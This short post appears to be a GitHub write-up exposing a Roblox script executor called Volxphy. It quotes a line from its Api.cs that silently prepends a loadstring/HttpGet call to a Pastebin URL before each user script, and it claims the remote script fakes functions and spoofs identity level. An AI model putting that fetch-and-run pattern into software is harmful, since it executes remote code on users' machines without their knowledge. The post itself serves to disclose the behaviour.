...
Because Volxphy is dumbass in Api.cs we can directly see this:
```Api.cx?.Execute("loadstring(game:HttpGet(\"https://pastebin.com/raw/Ju8xqCd2\"))()\n" + script);``` at line 67
As you can see, when we execute our script it executes with this very interesting pastebin link which contains for now this:
...
As you can see Volxphy overwrites printidentity so it's level 6, also we got faked funcs at the top.

**What we can do about it?**
Tell about it everyone on cloudy discord server chat and send this github link
